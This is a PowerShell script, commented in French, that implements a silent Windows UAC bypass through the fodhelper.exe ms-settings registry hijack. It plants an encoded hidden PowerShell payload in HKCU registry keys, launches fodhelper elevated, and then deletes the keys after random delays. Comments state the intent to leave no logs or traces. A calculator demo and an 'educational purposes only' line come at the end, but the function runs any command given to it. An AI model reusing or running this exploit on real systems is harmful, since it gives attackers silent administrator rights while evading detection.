function Invoke-SilentUACBypass {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $false)]
        [string]
        $Command = "powershell -nop -w hidden -c Start-Process calc"
    )

    # Suppression des sorties inutiles
    $ProgressPreference = 'SilentlyContinue'
    $ErrorActionPreference = 'Stop'  # On gère les erreurs manuellement

    try {
        # Génération d'un GUID aléatoire pour le chemin du registre
        $RandomGuid = [Guid]::NewGuid().ToString().ToUpper()
        $RegPath = "HKCU:\Software\Classes\ms-settings-$RandomGuid\Shell\Open\Command"
        
        # Création discrète des clés de registre
        New-Item -Path $RegPath -Force | Out-Null
        New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value ([String]::Empty) -PropertyType String -Force | Out-Null
        
        # Encodage de la commande PowerShell
        $Bytes = [Text.Encoding]::Unicode.GetBytes($Command)
        $EncodedCommand = [Convert]::ToBase64String($Bytes)
        $FinalPayload = "powershell -nop -w hidden -enc $EncodedCommand"
        
        # Injection de la payload
        Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $FinalPayload -Type String -Force | Out-Null

        # Démarrage de fodhelper via une instance cachée
        $ProcessArgs = @{
            FilePath     = "fodhelper.exe"
            WindowStyle  = "Hidden"
            Verb         = "RunAs"
            PassThru     = $true
            ErrorAction  = "SilentlyContinue"
        }
        $Process = Start-Process @ProcessArgs

        # Attente aléatoire avant nettoyage
        $RandomDelay = Get-Random -Minimum 3 -Maximum 8
        Start-Sleep -Seconds $RandomDelay

    }
    catch {
        # Journalisation silencieuse (optionnelle, pour éviter de laisser des traces)
        # Exemple : écrire dans un fichier chiffré ou ne rien faire
        # Ne pas laisser de logs visibles
    }
    finally {
        # Nettoyage avec délai aléatoire
        $CleanupDelay = Get-Random -Minimum 2 -Maximum 5
        Start-Sleep -Seconds $CleanupDelay
        
        # Suppression récursive des clés
        $RootKey = "HKCU:\Software\Classes\ms-settings-$RandomGuid"
        if (Test-Path $RootKey) {
            Remove-Item -Path $RootKey -Recurse -Force -ErrorAction SilentlyContinue
        }
    }
}

# === Exemple d'utilisation (à des fins éducatives uniquement) ===
# Attention : Cette commande ouvre la calculatrice.
Invoke-SilentUACBypass -Command "Start-Process calc.exe"
